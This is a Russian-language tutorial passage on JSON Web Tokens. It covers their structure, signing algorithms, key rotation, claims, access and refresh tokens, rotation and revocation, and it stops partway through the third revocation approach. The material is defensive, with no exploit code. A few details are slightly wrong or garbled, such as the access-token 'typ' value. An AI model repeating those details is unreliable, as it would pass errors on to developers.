# 118. JWT токены: структура, подпись, access vs refresh, security

## Зачем это знать

Ты открываешь Chrome DevTools, смотришь запрос от твоего SPA к API. Видишь заголовок `Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIi...`. Это JWT — токен по которому API узнаёт кто ты. Копируешь длинную строку на jwt.io, видишь свой email, роли, срок действия. Работает. Как именно работает — обычно черный ящик.

Пока не начинаются вопросы в проде. Пользователь пожаловался «залогинился, сразу выкидывает» — ищешь, оказывается clock skew между серверами и JWT «истёк до создания». Аудитор спросил «как отзываете токены при увольнении сотрудника» — оказывается никак, JWT нельзя отозвать после выдачи. Появилась CVE «algorithm confusion attack» на твою библиотеку — надо понимать что это и как проверить. Разработчик положил refresh_token в localStorage — надо объяснить почему это XSS-уязвимость. Всё это — вопросы про то, как JWT реально устроен.

Разница между «использую JWT» и «понимаю JWT» — способность за минуту ответить на конкретные вопросы. Что подписывается в JWT — вся строка или только payload? Почему `alg: none` был реальной CVE и почему её больше нет в правильных библиотеках. Как за одну RSA-верификацию сервер проверяет подпись сделанную с помощью 2048-битного ключа. Что такое `kid` и зачем нужен когда у AS может быть только один ключ. Почему access_token обычно JWT а refresh_token — обычно нет (просто случайная строка). Что физически делает refresh token rotation и от какой атаки защищает. Как реально выглядит logout когда JWT stateless — три разных подхода с trade-offs.

Разберём: что такое JWT фундаментально (не «токен», а конкретный формат). Три части и что каждая содержит с реальным декодированием. Алгоритмы подписи детально — HS256 (симметричный, HMAC) vs RS256 (асимметричный, RSA) vs ES256 (эллиптические кривые), когда какой применять с реальными команды генерации ключей. Все standard claims (iss, sub, aud, exp, iat, nbf, jti) с объяснением зачем каждый нужен и от какой атаки защищает. Custom claims. JWKS и key rotation — как AS меняет ключи не ломая live-клиентов. Access vs refresh — детальная разница в назначении, формате, времени жизни, хранении. Refresh token rotation — механика защиты от кражи с timeline. Revocation problem — почему JWT нельзя отозвать и три практических решения. Session management при stateless (sliding, absolute, logout). Хранение на клиенте — три варианта с разбором XSS и CSRF рисков. Security pitfalls: `alg=none` (реальная CVE), algorithm confusion attacks, weak secrets, missing validation. Правильная валидация JWT — полный чек-лист. Spring Security JWT support.

OAuth/OIDC протокол — файл 117. Keycloak как IDP — 119. Spring Security integration — 120. Здесь фокус на самом JWT: формат, подпись, безопасность.

## Что такое JWT: формат, а не концепция

Первое что путают — JWT это не «токен для аутентификации». JWT это **формат** упаковки данных с подписью. Такой формат может использоваться для аутентификации (access token), для передачи данных о пользователе (id token в OIDC), для одноразовых ссылок в email (magic link), для передачи данных между сервисами. JWT — универсальный контейнер.

**JWT** (JSON Web Token, RFC 7519, произносится «джот») имеет три свойства которые делают его популярным:

**Self-contained**. Токен содержит все данные внутри себя — id пользователя, email, роли, срок действия. Не нужно ходить в БД проверять «кто этот пользователь». Сервер получает JWT, декодирует, использует. Это фундаментально отличается от классической session cookie: `session_id=abc123` — сервер должен посмотреть в БД что за session abc123, кто её owner, ещё действительна ли она. JWT — вся эта информация уже в токене.

**Signed**. Токен подписан приватным ключом. Любое изменение содержимого — подпись становится невалидной. Не защищает от **чтения** (payload виден в base64), защищает от **подделки**. Атакующий не может изменить `role: user` на `role: admin` — подпись не сойдётся.

**Compact**. Base64URL-encoded строка (variant base64 без символов `+/=` — safe для URL). Может передаваться через HTTP header, URL, cookie, form field. Размер типичного JWT — 500-2000 байт.

Вот реальный JWT (переносы для читаемости, в реальности одной строкой):

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9
.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IklJb2FuIElpb2FuIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9
.
dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk-9-9zRZoLo0J...
```

Три части разделены точками (`.`). Порядок фиксированный:
1. **Header** — метаданные о токене (какой алгоритм подписи, какой ключ, тип).
2. **Payload** — данные (**claims** — утверждения о пользователе).
3. **Signature** — подпись первых двух частей.

Разберём каждую часть подробно с реальным декодированием.

## Header: что перед точкой

Первая часть до первой точки — Base64URL-encoded JSON:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImFiYzEyMyJ9
```

Base64-декодирование даёт:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "abc123"
}
```

Три поля:

**`alg`** (обязательное) — algorithm подписи. Определяет как проверять signature. Возможные значения:
- `HS256`, `HS384`, `HS512` — HMAC (симметричный).
- `RS256`, `RS384`, `RS512` — RSA (асимметричный).
- `ES256`, `ES384`, `ES512` — ECDSA (эллиптические кривые).
- `PS256`, `PS384`, `PS512` — RSA-PSS.
- `none` — БЕЗ ПОДПИСИ (опасно, см. security pitfalls).

Число (256/384/512) — bits в SHA-хеше который подписывается. Больше = медленнее + безопаснее. В prod обычно 256, чего достаточно для current threat model.

**`typ`** (опциональное, рекомендуется) — тип токена. Обычно `"JWT"`. Может быть `"JWT+at"` для JWT access tokens (RFC 9068 стандартизирует специфичный формат access token).

**`kid`** (опциональное, но необходимо в проде с ротацией) — key identifier. У AS может быть несколько ключей одновременно (rotation). `kid` указывает какой конкретно использовать для проверки этого JWT. RS ищет в JWKS ключ с этим `kid`, проверяет подпись.

**Критически важно понимать**: header **не секретен**. Любой может декодировать base64 и увидеть alg/kid. Header содержит **инструкции** для валидатора — «проверяй так-то, таким-то ключом». Секретность — в подписи, не в header.

Практический смысл: атакующий видит header, может изменить `alg` с `RS256` на `HS256` (см. algorithm confusion attack в security section), может убрать/добавить `kid`. Правильно написанный валидатор игнорирует эти манипуляции — использует **свою** ожидаемую конфигурацию (алгоритм + ключ), а не то что пришло в header.

## Payload: что между точками

Вторая часть — тоже Base64URL-encoded JSON:

```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IklJb2FuIElpb2FuIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyNDI2MjJ9
```

Декодируем:

```json
{
  "sub": "1234567890",
  "name": "Иван Иванов",
  "iat": 1516239022,
  "exp": 1516242622
}
```

Payload содержит **claims** — утверждения о subject (обычно пользователе). Каждое поле = один claim.

**Три категории claims**:

**Registered claims** (стандартные, определены в RFC 7519):
- `iss` (issuer) — кто выдал токен.
- `sub` (subject) — кому принадлежит.
- `aud` (audience) — для кого предназначен.
- `exp` (expiration) — когда истекает.
- `nbf` (not before) — до этого момента не валиден.
- `iat` (issued at) — когда выдан.
- `jti` (JWT ID) — уникальный идентификатор конкретного токена.

Детальный разбор каждого — ниже.

**Public claims** — стандартизированы IANA для интероперабельности между разными systems (OIDC защищает эти для аутентификации):
- `name`, `given_name`, `family_name`, `middle_name`.
- `email`, `email_verified`.
- `phone_number`, `phone_number_verified`.
- `preferred_username`.
- `picture`, `profile`.
- `locale`, `zoneinfo`.
- `updated_at`.

**Private claims** — специфичные для приложения:
- `roles`, `permissions`, `groups`.
- `tenant_id` (multi-tenant SaaS).
- `department`, `employee_id`.
- `feature_flags` (список включённых для этого user).
- Что угодно нужное приложению.

**Пример полного JWT payload из Keycloak реального prod'а**:

```json
{
  "exp": 1712345678,
  "iat": 1712342078,
  "auth_time": 1712341900,
  "jti": "5f8b1234-abc-def-98765",
  "iss": "https://keycloak.example.com/realms/myapp",
  "aud": ["account", "orders-api"],
  "sub": "550e8400-e29b-41d4-a716-446655440000",
  "typ": "Bearer",
  "azp": "my-web-app",
  "session_state": "session-uuid-xyz",
  "acr": "1",
  "allowed-origins": ["https://myapp.com"],
  "realm_access": {
    "roles": ["ADMIN", "USER", "offline_access"]
  },
  "resource_access": {
    "orders-api": {
      "roles": ["orders:read", "orders:write"]
    },
    "account": {
      "roles": ["manage-account", "view-profile"]
    }
  },
  "scope": "openid email profile",
  "email_verified": true,
  "preferred_username": "ivan.ivanov",
  "email": "ivan@example.com",
  "name": "Иван Иванов",
  "given_name": "Иван",
  "family_name": "Иванов"
}
```

Много информации в одном токене. Resource Server имеет всё что нужно без запроса в БД:
- Кто пользователь (`sub`, `email`, `name`).
- Какие роли (`realm_access.roles`, `resource_access.<client>.roles`).
- Для кого выдан (`aud`).
- Когда истечёт (`exp`).
- Из какого realm (`iss`).

**Критически важно повторить**: **payload НЕ секретен**. Любой перехвативший JWT может декодировать base64 и прочитать всё содержимое. Значит:

- **Не класть в JWT пароли** — они станут видны.
- **Не класть банковские карты, SSN, персональные данные** без реального шифрования.
- **Не класть внутренние ID баз данных** которые не должны утечь.
- **Не класть секретные бизнес-данные** — «zarplata: 500000».

JWT защищает от **подделки** (нельзя изменить незаметно), не от **чтения**. Если данные должны быть секретными — не в JWT, а в БД, а в JWT только `user_id` для lookup.

Есть **JWE** (JSON Web Encryption) — вариант с шифрованием payload. Редко используется, сложнее, обычно не нужен.

## Signature: подпись после последней точки

Третья часть — сама подпись:

```
dBjftJeZ4CVP-mB92K27uhbUJU1p1r_wW1gFWFOEjXk-9-9zRZoLo0J...
```

Также Base64URL-encoded (но содержимое — бинарные данные подписи, не JSON).

**Как вычисляется**:

```
signing_input = BASE64URL(header_json) + "." + BASE64URL(payload_json)
signature = SIGN(algorithm_from_header, key, signing_input)
```

Ключевые моменты:

1. **Подписывается конкретная строка** — «header.payload» уже в base64. Не JSON, а именно та строка что видна в токене.
2. Signature также base64-encoded, добавляется третьей частью.

**Почему именно строка а не JSON**. Base64-кодирование может слегка отличаться (whitespace, padding). Подписывать надо exactly то что передаётся по проводу, иначе валидация ломается. Использование фиксированной строки гарантирует consistency.

**Проверка подписи**:

1. Разбить JWT по точкам на 3 части.
2. Взять первые две части (header base64 + payload base64) — конкатенировать с точкой между.
3. Вычислить signature с известным ключом (тем что использовал AS).
4. Сравнить с third-part из JWT.
5. Если байты совпадают — JWT не подделан.

В коде (Java) через библиотеку типа Nimbus JWT это одна строка:

```java
SignedJWT jwt = SignedJWT.parse(token);
JWSVerifier verifier = new RSASSAVerifier(publicKey);
boolean valid = jwt.verify(verifier);
```

## Алгоритмы подписи глубоко

Выбор алгоритма — фундаментальное архитектурное решение. Разберём три главных.

### HS256: HMAC-SHA256 (симметричный)

**Как работает**. Один секретный ключ используется и для подписи, и для проверки. HMAC (Hash-based Message Authentication Code) с SHA-256.

```
signature = HMAC-SHA256(secret, "header.payload")

verify: HMAC-SHA256(secret, "header.payload") == signature
```

Тот же самый ключ вычисляет подпись, тот же — проверяет. Как классический password.

**Реальный пример**. Секрет = `"my-256-bit-secret-key-abcdef-1234"`.

```
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"user123","exp":1712345678}

signing_input = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMTIzIiwiZXhwIjoxNzEyMzQ1Njc4fQ"

signature_bytes = HMAC-SHA256("my-256-bit-secret-key-abcdef-1234", signing_input)
                = <32 bytes binary>

signature_b64 = base64url(signature_bytes)
              = "sIL_MnzOw-9NAiRe-U8LT7GRAAxNAWfB8qGGoIT8lqM"

jwt = signing_input + "." + signature_b64
```

**Плюсы**:
- **Быстро** — HMAC на порядок быстрее RSA. Микросекунды на проверку.
- **Просто** — один ключ, конфигурация тривиальна.
- **Ключ короткий** — 256 бит (32 байта) достаточно.

**Минусы — фундаментальные**:
- **Один ключ везде**. AS подписывает, RS проверяет → **оба знают секрет**. Значит RS **может подписывать** токены (имеет секрет). Нарушение принципа разделения — RS должен только проверять, не создавать.
- **Компрометация одного = компрометация всех**. Микросервисы за одним AS все имеют секрет → компрометация одного RS = атакующий может выдавать любые JWT для всей системы.
- **Distribution problem**. Как безопасно передать секрет 20 микросервисам? Vault, K8s secrets — можно, но каждый оператор с доступом видит секрет.

**Когда HS256 приемлем**:
- Одно приложение, один сервер (AS = RS одна программа).
- Микро-приложение с одним RS.
- Prototypes, dev environments.

**Когда HS256 НЕЛЬЗЯ**:
- Больше одного RS (микросервисы).
- Публичный API (внешние потребители).
- Enterprise с requirement разделения secret'ов.

**Требования к секрету**. Минимум **256 бит случайных данных**. Не пароль (низкая энтропия), а именно случайное. Генерация:

```bash
openssl rand -base64 32
# → "K7YvS9jN2mFqL4pWzXcT8rBhE1uYoR6iA0dPlM3nGxk="
```

Или Python:
```python
import secrets
print(secrets.token_urlsafe(32))
```

Слабый секрет (`"password123"`) — brute-force за минуты, JWT можно подделать.

### RS256: RSA-SHA256 (асимметричный)

**Как работает**. Пара ключей: приватный (для подписи) и публичный (для проверки). Работают вместе через математику RSA.

```
signature = RSA-SIGN(private_key, SHA256("header.payload"))

verify: RSA-VERIFY(public_key, signature, SHA256("header.payload"))
```

Ключевое: **проверка НЕ требует приватного ключа**. Только публичный.

**Реальные ключи**. Генерация RSA 2048-битной пары:

```bash
# Приватный ключ
openssl genrsa -out private.pem 2048

# Публичный ключ из приватного
openssl rsa -in private.pem -pubout -out public.pem
```

Приватный ключ (~1700 символов base64):
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78L
hWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknj
... много строк ...
QNo3XkbFtEnP2CVXqBrE1Ek3EySfnRi7GKVfBcm0oQ==
-----END RSA PRIVATE KEY-----
```

Публичный ключ (~450 символов base64):
```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0vx7agoebGcQSuuPiLJX
ZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tS
... короче чем приватный ...
zwIDAQAB
-----END PUBLIC KEY-----
```

**Плюсы над HS256** — критически важные для enterprise:

- **RS не может подписывать** — не имеет приватного ключа. Чётко: **только AS создаёт токены**. Гарантия архитектуры.
- **Публичный ключ можно раздавать всем** безопасно. AS публикует JWKS endpoint с публичными ключами, любой RS может скачать и использовать. Не секрет.
- **Компрометация RS не позволяет создавать токены**. Максимум — читать проходящие, но не подделывать.
- **Standard для enterprise/OAuth**. Все mainstream IDP (Keycloak, Auth0, Okta, Google, Azure AD) используют RS256 по умолчанию.

**Минусы**:
- **Медленнее** — RSA операции значительно дороже HMAC. Проверка ~10x медленнее.
- **Ключи длиннее** — 2048-4096 бит vs 256 для HS256.
- **Setup сложнее** — генерация пары, distribution публичного.

Для типичного API — 10x replace никогда не проблема. Прирост скорости HMAC не окупает потери безопасности.

**Стандарт**: **RS256 для OAuth/OIDC**. Всегда, если нет очень специфичной причины использовать что-то другое.

### ES256: ECDSA-SHA256 (эллиптические кривые)

**Как работает**. Как RS256, но на эллиптических кривых вместо RSA. Меньшие ключи при том же уровне безопасности.

**Сравнение размеров**:
- RSA 2048 бит ≈ ECDSA 224 бит по безопасности.
- RSA 3072 бит ≈ ECDSA 256 бит.
- RSA 15360 бит ≈ ECDSA 521 бит.

Значит ES256 (256-битный) сравним с RSA 3072. Быстрее в разы, короче ключи и подписи.

**Генерация**:

```bash
# Приватный ключ на кривой P-256
openssl ecparam -genkey -name prime256v1 -noout -out ec_private.pem

# Публичный
openssl ec -in ec_private.pem -pubout -out ec_public.pem
```

**Когда использовать ES256**:
- Performance-critical (миллионы токенов в секунду).
- IoT, mobile — меньшие подписи экономят трафик.
- Modern setup — новые проекты часто идут сразу на ES256.

**Совместимость** — все mainstream OAuth библиотеки поддерживают ES256. Keycloak, Auth0 — есть.

## JWKS: как AS публикует публичные ключи

С RS256/ES256 клиенту нужен публичный ключ для проверки. Как получить?

**JWKS** (JSON Web Key Set, RFC 7517) — стандартный формат для публикации ключей. AS предоставляет endpoint возвращающий JSON со списком публичных ключей.

**Пример JWKS от Keycloak**:

```
GET https://keycloak.example.com/realms/myapp/protocol/openid-connect/certs
```

```json
{
  "keys": [
    {
      "kid": "abc123",
      "kty": "RSA",
      "alg": "RS256",
      "use": "sig",
      "n": "0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw",
      "e": "AQAB"
    },
    {
      "kid": "def456",
      "kty": "RSA",
      "alg": "RS256",
      "use": "sig",
      "n": "...",
      "e": "AQAB"
    }
  ]
}
```

Поля каждого ключа:
- **`kid`** — key ID. По этому полю RS находит ключ соответствующий `kid` из header'а JWT.
- **`kty`** — key type (`RSA`, `EC`).
- **`alg`** — какой алгоритм подписи с этим ключом.
- **`use`** — назначение: `sig` (signature) или `enc` (encryption).
- **`n`** и **`e`** — modulus и exponent RSA (для восстановления публичного ключа).

**Как RS использует JWKS**:

1. При старте — HTTP GET JWKS endpoint.
2. Кэширует ответ (обычно 5-60 минут).
3. При получении JWT:
   - Читает `kid` из header'а.
   - Находит ключ с этим `kid` в кэше.
   - Использует для проверки подписи.
4. Если `kid` неизвестен — принудительный refresh JWKS кэша (может быть новый ключ появился), попробовать снова.
5. Если снова неизвестен — JWT invalid.

**Key rotation** — обычный процесс. AS периодически (раз в год) генерирует новую пару ключей, начинает подписывать новые токены новым, но публикует **оба** ключа в JWKS. Старые токены (подписанные старым ключом) всё ещё валидны. Через время (когда все старые токены истекут) — старый ключ убирается из JWKS.

**Client (RS) видит**:
- Сегодня — старые JWT с `kid: abc123` валидируются публичным ключом abc123.
- Завтра — новые JWT с `kid: def456`, RS делает refresh JWKS, находит новый ключ, валидирует.
- Через неделю — старый ключ убран из JWKS, но старые токены уже истекли.
- Ни один клиент не сломался.

Spring Security кэширует JWKS автоматически, обрабатывает unknown `kid` через refresh.

## Standard claims: детально с примерами атак

Каждый standard claim защищает от конкретной атаки. Понимать зачем каждый — понимать зачем их проверять.

### `iss` — issuer

`"iss": "https://keycloak.example.com/realms/myapp"` — URL AS выдавшего токен.

**Проверка**: точное строковое сравнение с ожидаемым (`https` vs `http` — разные, trailing slash — разные).

**От какой атаки защищает**. Атакующий поднимает свой AS, получает от него JWT, отправляет на твой API. Твой API проверяет подпись — не сходится (это не его ключ). Уже защищён? Не совсем. Если атакующий взломал **чужой** AS (не твой) и имеет его приватный ключ — может подписать JWT валидной подписью. Но `iss` будет URL чужого AS. Проверка `iss` против ожидаемого — блокирует.

**Реальный сценарий**. Твой API работает с двумя Keycloak'ами — dev и prod. Токен от dev не должен работать в prod. `iss` проверка гарантирует.

### `sub` — subject

`"sub": "550e8400-e29b-41d4-a716-446655440000"` — уникальный идентификатор subject внутри `iss`.

Для user'а — user_id. Для service (Client Credentials flow) — client_id.

**Важное свойство**: **уникален внутри одного `iss`**. Пользователь с sub=`123` в Google и user с sub=`123` в Facebook — разные пользователи. Глобальный уникальный идентификатор = `iss + sub`.

**Проверка**: обычно не валидируется, а используется. Приложение получает `sub`, использует для lookup в своей БД.

### `aud` — audience

`"aud": "orders-api"` (string) или `"aud": ["orders-api", "reports-api"]` (array) — для кого предназначен токен.

**Проверка**: RS проверяет что его client_id содержится в audience.

**От какой атаки защищает — конкретный сценарий**. Пользователь залогинился в app1.com, получил JWT с `aud: app1`. Установил malicious plugin который украл этот токен. Плагин пробует отправить токен на app2.com API. app2 проверяет `aud` — не находит `app2` → отвергает.

Без aud check — токен от app1 можно использовать против app2 если у них общий AS. С check — токены жёстко привязаны к получателю.

**Реальный prod bug**. В Keycloak по умолчанию `aud` = `account`. Твой API `orders-api` получает эти токены — если не проверяешь aud, работает. Но токены выданные для **другого** клиента этого же Keycloak realm тоже проходят (у них тоже `aud: account`). Возможна privilege escalation.

**Правильно**: настроить Keycloak audience mapper — добавить `aud: orders-api` для токенов твоего API. Проверять в приложении.

### `exp` — expiration

`"exp": 1712345678` — Unix timestamp (секунды с 1970-01-01 UTC) когда токен станет невалиден.

**Проверка**: `exp > current_time - clock_skew` (обычно skew 30 сек).

**От какой атаки защищает**. Токен украден (XSS, компрометация клиента). Без exp — атакующий использует вечно. С exp = 15 минут — максимум 15 минут доступа. После — токен просроченный, надо украсть новый.

**Trade-off**:
- Короткий exp (5-15 мин): меньше impact компрометации, но чаще refresh (нагрузка на AS).
- Длинный exp (часы): реже refresh, но больше окно для атакующего.

Стандарт для access token: 5-60 минут. Для sensitive операций (banking) — 5 минут. Для non-sensitive — до часа.

### `iat` — issued at

`"iat": 1712342078` — когда токен выдан.

**Использование**:
- **Аудит**: «когда пользователь получил этот токен».
- **Rate limiting**: «не более 1 токен в минуту».
- **Freshness check**: «токен свежий или ему уже день?».
- В OIDC — `auth_time` определяет когда пользователь **логинился** (может быть раньше `iat` если использовал refresh token).

**Не обязательно проверять** iat против current_time (в отличие от exp). Просто polezная информация.

### `nbf` — not before

`"nbf": 1712349000` — до этого момента токен НЕ валиден.

**Проверка**: `nbf <= current_time + clock_skew`.

**Use case редкий**. Позволяет выдать токен «активируется через час». Например: подписка на месяц оплачена на 15 число, выдаём токен со `nbf: 15-е число` — он не работает до этого дня.

Обычно `nbf` не используется, но правильный validator проверяет если поле есть.

### `jti` — JWT ID

`"jti": "5f8b1234-abc-def-98765"` — уникальный ID конкретного токена (обычно UUID).

**Использование**:
- **Blacklist для revocation** — храним jti отозванных токенов в Redis. При проверке JWT смотрим не в списке ли.
- **Replay protection** — сервер не обрабатывает один и тот же токен дважды (для одноразовых операций).
- **Correlation** — logging: «request ABC был с токеном jti=XYZ».

Опциональное поле. Если revocation через blacklist не реализуется — не нужно. Но AS может выдавать всегда (лучше на всякий случай).

### Комбинация: почему проверять всё

Атака при отсутствии проверок:
- Только signature check → атакующий может использовать украденный токен вечно (нет exp check).
- Только signature + exp → истёкший токен не работает, но токен для другого API работает (нет aud check).
- Только signature + exp + aud → токен от чужого AS может пройти (нет iss check).

**Правильный validator проверяет всё**: signature + iss + aud + exp + iat + nbf.

Spring Security с правильной конфигурацией делает это автоматически.

## Access Token vs Refresh Token: не только назначение

Разбор в файле 117 был про **зачем** каждый. Теперь — про **формат и жизненный цикл**.

### Access Token

**Формат**: обычно **JWT**. Почему JWT:
- RS может валидировать **локально** через подпись — без запроса к AS.
- Содержит все claims нужные для авторизации — быстро.
- Stateless — RS не хранит session.

**Время жизни**: короткое, 5-60 минут.

**Использование**: каждый API запрос. `Authorization: Bearer <access_token>`.

**Хранение на клиенте**: memory (SPA), Keychain/Keystore (mobile), session store (backend). См. хранение ниже.

**Пример**:
```json
{
  "sub": "user-123",
  "email": "ivan@example.com",
  "roles": ["USER"],
  "scope": "orders:read orders:write",
  "iat": 1712342078,
  "exp": 1712345678,  // истечёт через час
  "iss": "https://keycloak.example.com/realms/myapp",
  "aud": "orders-api"
}
```

### Refresh Token

**Формат — часто НЕ JWT**. Обычно **opaque** (случайная строка, например 40+ символов base64).

**Почему opaque**:
- Refresh token используется только с AS, не с RS → не нужна self-containedness JWT.
- Opaque позволяет AS хранить **состояние**: rotation, revocation, association с session.
- Проще управлять — сервер знает всё об этом токене.

**Пример opaque refresh token**:
```
0.AXsAxxx1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ
```

Просто случайная строка без структуры. Смысл только в БД AS: `refresh_tokens` таблица с записями `token_hash → user_id, client_id, created_at, expires_at, revoked, ...`.

**Время жизни**: долгое, часы-дни-месяцы.

**Использование**: только с AS token endpoint. **Никогда** к RS.

**Хранение на клиенте**: httpOnly cookie (SPA), Keychain/Keystore (mobile), session (backend).

**Refresh flow**:
```http
POST /realms/myapp/protocol/openid-connect/token
grant_type=refresh_token
&refresh_token=0.AXsAxxx1234567890...
&client_id=my-app
```

Response — новый access_token (и часто новый refresh_token при rotation, см. ниже).

### Ключевые различия таблицей

| Свойство | Access Token | Refresh Token |
|----------|--------------|---------------|
| Формат | JWT | Часто opaque (случайная строка) |
| Time to live | 5-60 минут | Часы-месяцы |
| Отправляется куда | На каждый API запрос к RS | Только к AS token endpoint |
| Как проверяется | Локально через подпись + JWKS | AS lookup в БД |
| Содержит user данные | Да (в claims) | Нет (просто ID) |
| Может быть revoked | Сложно (см. revocation ниже) | Легко (AS удаляет из БД) |
| Хранение на клиенте | Memory / secure storage | httpOnly cookie / secure storage |
| Использование в headers | `Authorization: Bearer` | Только POST body в refresh запросе |

## Refresh Token Rotation: механика защиты

Best practice в 2024 — **rotation**. Разберём подробно почему нужно и как работает.

**Без rotation** (плохо):

Client получил refresh_token `RT1`. Использует много раз при истечении access:
- 10:00 — истёк access, refresh с `RT1` → новый access.
- 11:00 — снова refresh с `RT1` → новый access.
- 12:00 — refresh с `RT1`.
- ... `RT1` живёт месяц, много раз используется.

Проблема: `RT1` украден через XSS/malware/etc. Атакующий использует `RT1` → получает access. **Legit клиент тоже использует `RT1`** — оба получают access параллельно. AS не отличает legit от атакующего. Оба используют украденный `RT1` до его истечения (месяцы).

Пользователь logout — не помогает если атакующий имеет `RT1`. Только смена пароля + revoke всех refresh tokens может помочь, но пользователь может даже не знать что скомпрометирован.

**С rotation** (правильно):

Каждое использование refresh_token AS:
1. **Инвалидирует** используемый refresh_token.
2. **Выдаёт новый** refresh_token.
3. Отдаёт client'у новый access_token + новый refresh_token.

Client всегда использует **последний** полученный refresh_token.

**Timeline с rotation**:
```
10:00: client refresh с RT1 
       → AS: RT1 инвалидирован, RT2 выдан
       → client получил AT2 + RT2, хранит RT2

11:00: client refresh с RT2
       → AS: RT2 инвалидирован, RT3 выдан
       → client получил AT3 + RT3
       
... и так далее
```

**Что происходит при краже**:

Timeline с атакующим:
```
10:00: legit client refresh с RT1 → RT2 выдан, RT1 инвалидирован. Client хранит RT2.
       Атакующий украл RT1 (не знает что уже инвалидирован).

10:30: атакующий refresh с RT1
       → AS: RT1 уже использован. 
       → Реакция: подозрительно! Кто-то использует старый RT.
       → AS терминирует ВСЮ session пользователя, все токены revoked.
       → Атакующий и legit оба получат ошибку при следующем refresh.

10:31: legit client refresh с RT2 → **error**, session terminated.
       Client показывает "session expired", user делает login снова.
```

Атакующий получил максимум одну попытку с украденным токеном (и то — может не получить если сначала refresh сделал legit). Legit пользователь замечает — заходит снова.

Хорошая security: AS может отправить alert пользователю («подозрительная активность, кто-то использовал старый refresh token»), user знает что скомпрометирован.

**Реализация в Keycloak**: в Client settings опция `Revoke Refresh Token = ON`. При включении — каждое использование refresh даёт новый + старый инвалидирован. Дефолт — OFF (для backward compatibility), но best practice — включить.

**Реализация в приложении (client)**: важно **всегда** сохранять последний refresh_token, использовать его для следующего refresh. Если хранишь `RT1`, использовал, получил `RT2`, но забыл сохранить `RT2` — при следующем refresh пойдёшь с `RT1`, AS решит что атака, terminate session.

## Revocation problem: почему JWT нельзя отозвать

**Фундаментальная проблема**. JWT self-contained и stateless по дизайну. RS получает JWT, проверяет подпись + exp — валидный, доверяем. Никакая **другая** сторона не может «отозвать» уже выданный подписанный документ.

Сценарии где нужен revoke:

- **Пользователь logout** — токены должны перестать работать сразу.
- **Пользователь сменил пароль** — все старые токены должны инвалидироваться (может кто-то украл старый).
- **Обнаружена компрометация** — срочный logout всего user'а.
- **Пользователь уволен / забанен** — доступ должен пропасть немедленно.
- **Изменение permissions** — новые ограничения должны применяться сразу, не через час когда старый JWT истечёт.

Проблема: JWT валиден пока `exp` не прошёл. Сервер не знает что пользователь logged out.

Три практических решения, каждое со своими trade-offs.

### Решение 1: Короткие access_token TTL

Access_token на 5-15 минут. Через максимум 15 минут украденный токен станет невалидным. Revocation actually не нужен — просто ждать expiration.

**Плюсы**:
- **Полный stateless** — никаких БД lookup при валидации.
- Просто настроить (одна настройка в AS).
- Работает без специальной инфраструктуры.

**Минусы**:
- **UX компромисс** — пользователь может «отвалиться» когда access истёк, refresh не сработал. Приходится делать background refresh чтобы незаметно для user.
- **Не мгновенно** — максимум 15 минут задержки на logout. Для sensitive операций (banking) — 5 минут максимум.
- **Не solve все сценарии** — если атакующий имеет refresh_token, продолжает получать новые access каждые 15 минут.

**Практика**: часто first line of defense, комбинируется с другими.

### Решение 2: Blacklist (Deny list)

Хранить `jti` отозванных токенов в Redis или БД. RS при проверке JWT смотрит blacklist:

```python
# Псевдокод RS
def validate_jwt(token):
    jwt = parse(token)
    verify_signature(jwt)
    verify_claims(jwt)  # exp, iss, aud, etc.
    
    if redis.get(f"blacklist:{jwt.jti}"):
        raise TokenRevoked()
    
    return jwt
```

При logout / revoke — AS добавляет jti в blacklist на время до его exp:

```python
# Псевдокод AS
def logout(token):
    jwt = parse(token)
    ttl = jwt.exp - now()  # сколько ещё живёт
    redis.setex(f"blacklist:{jwt.jti}", ttl, "1")
    # После exp автоматически исчезнет из Redis
```

**Плюсы**:
- **Мгновенный revoke** — как только добавлен в blacklist, следующий запрос отвергнут.
- **Selective** — можно отозвать конкретный токен, не всю session.

**Минусы**:
- **Stateful** — теряется преимущество stateless JWT. Нужен shared Redis доступный всем RS.
- **Extra check на каждый запрос** — latency (обычно minimal с Redis, ~1ms).
- **Distributed** — все RS должны видеть blacklist. Global Redis / replicated cache.
- **Blacklist растёт** — но с TTL до exp автоматически чистится.

**Практика**: используется для «критичных» revocations (compromise, employee termination). Regular logout часто не помещают в blacklist (просто клиент удаляет токен локально, ждём exp).

### Решение 3: User-level revocation через версию

В БД пользователя хранится `token_version` (integer). При выдаче JWT — включается текущий `token_version` в claim:

```json
{
  "sub": "user-123",
  "token_version": 5,
  ...
}
```
